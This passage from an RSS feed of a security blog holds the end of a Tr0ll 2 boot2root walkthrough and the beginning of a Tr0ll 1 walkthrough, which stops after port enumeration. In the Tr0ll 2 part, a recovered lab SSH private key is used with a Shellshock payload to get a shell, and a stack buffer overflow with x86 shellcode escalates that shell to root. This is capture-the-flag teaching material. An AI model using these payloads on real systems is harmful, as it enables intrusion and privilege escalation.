&lt;p&gt;Nothing exciting was in the page source:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;What did you really think to find here? Try Harder&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;cat_the_troll.jpg&lt;/code&gt; was downloaded from all the above locations from the target and examined.&lt;/p&gt;

&lt;p&gt;ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Look Deep within y0ur_self &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the answer&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I tired this against the previously downloaded &lt;code&gt;lmao.zip&lt;/code&gt; file, no luck. I tried &lt;code&gt;y0ur_self&lt;/code&gt; as web path like on tr0ll:1&lt;/p&gt;

&lt;p&gt;Success, the web dir contained a text file &lt;code&gt;http://172.31.31.6/y0ur_self/answer.txt&lt;/code&gt; scrolling though from the browser it looked like the file was base64 encoded.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;wget http://172.31.31.6/y0ur_self/answer.txt&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;wget http://172.31.31.6/y0ur_self/answer.txt&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Decoding the file revealed it was massive, the following was used to decode and sort by line length:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;base64 decoding&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;base64 -d answer.txt &amp;gt; answer-decoded.txt &amp;amp;&amp;amp; awk '{print length, $0;}' answer-decoded.txt | sort -nr | less&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;30 ItCantReallyBeThisEasyRightLOL&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;The top line looked promising, &lt;code&gt;ItCantReallyBeThisEasyRightLOL&lt;/code&gt; I tried this against &lt;code&gt;lmao.zip&lt;/code&gt;&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;unzip lmao.zip&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;unzip lmao.zip&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;Archive:  lmao.zip&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;[lmao.zip] noob password:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;  inflating: noob &lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;&lt;img src=&quot;/img/data-yes-fist.gif&quot; alt=&quot;Data Yes Fist&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yes!&lt;/p&gt;

&lt;p&gt;The contents of &lt;code&gt;noob&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
&lt;span class=&quot;nv&quot;&gt;zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ssh-shellshock&quot;&gt;SSH Shellshock&lt;/h3&gt;

&lt;p&gt;Attempting to login using the discovered key failed, with a messaging saying &lt;code&gt;TRY HARDER LOL!&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/vulcan-ragequit.gif&quot; alt=&quot;Vulcan Rage Quit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message.&lt;/p&gt;

&lt;p&gt;I googled some shellshock options and managed to spawn a shell with:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'&lt;/code&gt;&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;shellshock ssh&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;id&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;uid=1002(noob) gid=1002(noob) groups=1002(noob)&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;##Local Enumeration&lt;/p&gt;

&lt;p&gt;Transfered my local enumeration script to the target, disclosing the following odd sticky bit files:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;## Sticky Bit                          ##&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;

drwsr-xr-x 3 root root 4096 Dec 29 19:00 /nothing_to_see_here
drwsr-xr-x 5 root root 4096 Oct  4 22:36 /nothing_to_see_here/choose_wisely
drwsr-xr-x 2 root root 4096 Oct  5 21:19 /nothing_to_see_here/choose_wisely/door2
drwsr-xr-x 2 root root 4096 Oct  5 21:18 /nothing_to_see_here/choose_wisely/door3
drwsr-xr-x 2 root root 4096 Oct  4 22:19 /nothing_to_see_here/choose_wisely/door1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Each of the door directories contained a file called r00t, du -sh * in the parent dir &lt;code&gt;choose_wisely&lt;/code&gt; showed one of the files was larger - I started there.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;od -S 1 r00t&lt;/code&gt; was used against each of the files, the larget file contained:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;0017545 bof.c
0017553 __init_array_end
0017574 _DYNAMIC
0017605 __init_array_start
0017630 _GLOBAL_OFFSET_TABLE_
0017656 __libc_csu_fini
0017676 __i686.get_pc_thunk.bx
0017725 data_start
0017740 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@@GLIBC_2.0
0017762 _edata
0017771 _fini
0017777 strcpy@@GLIBC_2.0
0020021 __DTOR_END__
0020036 __data_start
0020053 __gmon_start__
0020072 &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@@GLIBC_2.0
0020112 __dso_handle
0020127 _IO_stdin_used
0020146 __libc_start_main@@GLIBC_2.0
0020203 __libc_csu_init&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it’s more tr0ling).&lt;/p&gt;

&lt;p&gt;##Exploit Development&lt;/p&gt;

&lt;p&gt;###Fuzzing&lt;/p&gt;

&lt;p&gt;I started by fuzzing with 300 A’s:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;fuzzing linux binary&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;./r00t $(python -c 'print &quot;A&quot; *300')&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Segmentation fault&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Bangin’ then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 &lt;code&gt;Illegal instruction&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Using gdb I located the address of ESP.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i r esp
esp            0xbffffb80 0xbffffb80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Padded with some NOPs - for a reliable landing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/warf-jump.gif&quot; alt=&quot;Worf jump&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overwrote EIP with the location of ESP and tagged some shellcode on the end to exectute a shell.&lt;/p&gt;

&lt;p&gt;###Final Exploit&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;./r00t &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*268 + &quot;\x80\xfb\xff\xbf&quot; + &quot;\x90&quot; * 10 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Note: gdb drops privileges on SUID, in order to spawn the new shell with SUID you need to execute the exploit outside of gdb, or the shell will spawn as the unprivileged user.&lt;/p&gt;

&lt;p&gt;The binaries in &lt;code&gt;choose_wisely/door*&lt;/code&gt; are rotated, the largest is the vulnerable binary.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Exploit Process&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;du -sh *&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;output&quot;&gt;12K door1&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;output&quot;&gt;12K door2&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;output&quot;&gt;16K door3&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;cd door3&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;./r00t $(python -c 'print &quot;A&quot;*268 + &quot;\x80\xfb\xff\xbf&quot; + &quot;\x90&quot; * &lt;br /&gt;10 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\&lt;br /&gt;xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;')&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;whoami&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;root&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;cat /root/Proof.txt&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;You win this time young Jedi...&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;a70354f0258dcc00292c72aab3c8b1e4&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;##Root dance&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/girl-dancing-excited.gif&quot; alt=&quot;Root Dance&quot; /&gt;&lt;/p&gt;

&lt;p&gt;##Thanks&lt;/p&gt;

&lt;p&gt;Thanks to &lt;a href=&quot;https://twitter.com/@maleus21&quot;&gt;@maleus21&lt;/a&gt; for creating this VM challenege.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Tr0ll 1 Walkthrough</title>
          <link>https://highon.coffee/blog/tr0ll-1-walkthrough/</link>
          <pubDate>Fri, 26 Dec 2014 00:12:52 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/tr0ll-1-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#remote-exploit&quot; id=&quot;markdown-toc-remote-exploit&quot;&gt;Remote Exploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#weak-filesystem-permissions&quot; id=&quot;markdown-toc-weak-filesystem-permissions&quot;&gt;Weak Filesystem Permissions&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enumeration-findings&quot; id=&quot;markdown-toc-enumeration-findings&quot;&gt;Enumeration Findings&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#got-root&quot; id=&quot;markdown-toc-got-root&quot;&gt;Got Root&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I thought I’d have a go at a Boot2Root over Christmas, looking through the VM’s I came accross &lt;a href=&quot;https://www.vulnhub.com/entry/tr0ll-1,100/&quot;&gt;Tr0ll: 1&lt;/a&gt; the description caught my attention:&lt;/p&gt;

&lt;p&gt;
&lt;i&gt;Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.&lt;/i&gt;

&lt;i&gt;The goal is simple, gain root and get Proof.txt from the /root directory.&lt;/i&gt;

&lt;i&gt;Not for the easily frustrated! Fair warning, there be trolls ahead!&lt;/i&gt;

&lt;i&gt;Difficulty: Beginner ; Type: boot2root&lt;/i&gt;
&lt;/p&gt;

&lt;p&gt;I downloaded the VM, span it up in VMWare and got cracking.&lt;/p&gt;

&lt;p&gt;##Enumeration&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;nmap -p 1-65535 -sV -sS -A -T4 192.168.78.140&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap -p 1-65535 -sV -sS -A -T4 192.168.78.140&lt;/span&gt;
        &lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-24 18:26 GMT&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap scan report for 192.168.78.140&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.00035s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Not shown: 65532 closed ports&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT   STATE SERVICE VERSION &lt;br /&gt;&lt;/span&gt; 
          &lt;span class=&quot;output&quot;&gt;21/tcp open  ftp     vsftpd 3.0.2&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| ftp-anon: Anonymous FTP login allowed (FTP code 230)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap [NSE: writeable]&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;22/tcp open  ssh     (protocol 2.0)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| ssh-hostkey: &lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| http-robots.txt: 1 disallowed entry &lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_/secret&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_http-title: Site doesn't have a title (text/html).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;SF-Port22-TCP:V=6.47%I=7%D=12/24%Time=549B054B%P=x86_64-unknown-linux-gnu%&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;SF:r(NULL,29,&quot;SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n&quot;);&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;MAC Address: 00:0C:29:D9:C1:FE (VMware)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Device type: general purpose&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Running: Linux 3.X&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;OS CPE: cpe:/o:linux:linux_kernel:3&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;OS details: Linux 3.11 - 3.14&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Network Distance: 1 hop&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Service Info: OS: Unix&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;TRACEROUTE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;HOP RTT     ADDRESS&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;1   0.35 ms 192.168.78.140&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;###Service Enumeration&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 21&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;FTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;vsftpd 3.0.2&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;protocol 2.0&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.4.7 ((Ubuntu))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

